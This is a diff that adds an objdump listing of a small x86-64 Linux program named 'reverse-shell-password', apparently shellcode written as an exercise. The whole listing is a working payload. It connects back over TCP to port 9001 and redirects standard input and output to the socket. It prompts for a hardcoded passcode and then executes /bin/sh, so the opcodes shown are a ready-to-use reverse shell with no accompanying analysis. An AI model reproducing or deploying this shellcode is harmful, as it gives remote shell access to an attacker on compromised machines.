@@ -1,0 +1,98 @@
+
+reverse-shell-password:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 <_start>:
+  401000:	eb 15                	jmp    401017 <main>
+
+0000000000401002 <ask_pass>:
+  401002:	54                   	push   rsp
+  401003:	65 6c                	gs ins BYTE PTR es:[rdi],dx
+  401005:	6c                   	ins    BYTE PTR es:[rdi],dx
+  401006:	20 6d 65             	and    BYTE PTR [rbp+0x65],ch
+  401009:	20 74 68 65          	and    BYTE PTR [rax+rbp*2+0x65],dh
+  40100d:	20 70 61             	and    BYTE PTR [rax+0x61],dh
+  401010:	73 73                	jae    401085 <password+0x21>
+  401012:	63 6f 64             	movsxd ebp,DWORD PTR [rdi+0x64]
+  401015:	65                   	gs
+  401016:	0a                   	.byte 0xa
+
+0000000000401017 <main>:
+  401017:	48 31 f6             	xor    rsi,rsi
+  40101a:	48 f7 e6             	mul    rsi
+  40101d:	48 83 c0 29          	add    rax,0x29
+  401021:	6a 02                	push   0x2
+  401023:	5f                   	pop    rdi
+  401024:	48 ff c6             	inc    rsi
+  401027:	0f 05                	syscall 
+  401029:	48 97                	xchg   rdi,rax
+  40102b:	48 31 c0             	xor    rax,rax
+  40102e:	50                   	push   rax
+  40102f:	66 68 23 29          	pushw  0x2923
+  401033:	66 6a 02             	pushw  0x2
+  401036:	48 89 e6             	mov    rsi,rsp
+  401039:	48 31 c0             	xor    rax,rax
+  40103c:	48 89 c2             	mov    rdx,rax
+  40103f:	48 83 c0 2a          	add    rax,0x2a
+  401043:	48 89 e6             	mov    rsi,rsp
+  401046:	48 83 c2 10          	add    rdx,0x10
+  40104a:	0f 05                	syscall 
+  40104c:	48 31 c0             	xor    rax,rax
+  40104f:	b0 21                	mov    al,0x21
+  401051:	48 31 f6             	xor    rsi,rsi
+  401054:	0f 05                	syscall 
+  401056:	b0 21                	mov    al,0x21
+  401058:	48 ff c6             	inc    rsi
+  40105b:	0f 05                	syscall 
+  40105d:	b0 21                	mov    al,0x21
+  40105f:	48 ff c6             	inc    rsi
+  401062:	0f 05                	syscall 
+
+0000000000401064 <password>:
+  401064:	48 31 c0             	xor    rax,rax
+  401067:	48 31 d2             	xor    rdx,rdx
+  40106a:	48 ff c0             	inc    rax
+  40106d:	48 89 c7             	mov    rdi,rax
+  401070:	48 8d 35 8b ff ff ff 	lea    rsi,[rip+0xffffffffffffff8b]        # 401002 <ask_pass>
+  401077:	b2 15                	mov    dl,0x15
+  401079:	0f 05                	syscall 
+  40107b:	48 31 d2             	xor    rdx,rdx
+  40107e:	48 31 c0             	xor    rax,rax
+  401081:	48 31 ff             	xor    rdi,rdi
+  401084:	48 89 e6             	mov    rsi,rsp
+  401087:	48 83 c2 20          	add    rdx,0x20
+  40108b:	0f 05                	syscall 
+  40108d:	48 89 e7             	mov    rdi,rsp
+  401090:	48 31 f6             	xor    rsi,rsi
+  401093:	56                   	push   rsi
+  401094:	48 be 6f 6e 6f 67 6f 	movabs rsi,0xa646f6f676f6e6f
+  40109b:	6f 64 0a 
+  40109e:	56                   	push   rsi
+  40109f:	48 be 61 74 69 61 6d 	movabs rsi,0x7470756d61697461
+  4010a6:	75 70 74 
+  4010a9:	56                   	push   rsi
+  4010aa:	48 be 79 73 77 65 61 	movabs rsi,0x6874726165777379
+  4010b1:	72 74 68 
+  4010b4:	56                   	push   rsi
+  4010b5:	48 be 69 73 6f 6c 65 	movabs rsi,0x6c6e6d656c6f7369
+  4010bc:	6d 6e 6c 
+  4010bf:	56                   	push   rsi
+  4010c0:	48 89 e6             	mov    rsi,rsp
+  4010c3:	48 31 c9             	xor    rcx,rcx
+  4010c6:	80 c1 20             	add    cl,0x20
+  4010c9:	f3 a6                	repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
+  4010cb:	75 97                	jne    401064 <password>
+  4010cd:	48 31 c0             	xor    rax,rax
+  4010d0:	50                   	push   rax
+  4010d1:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
+  4010d8:	2f 73 68 
+  4010db:	53                   	push   rbx
+  4010dc:	48 89 e7             	mov    rdi,rsp
+  4010df:	50                   	push   rax
+  4010e0:	48 89 e2             	mov    rdx,rsp
+  4010e3:	57                   	push   rdi
+  4010e4:	48 89 e6             	mov    rsi,rsp
+  4010e7:	48 83 c0 3b          	add    rax,0x3b
+  4010eb:	0f 05                	syscall 
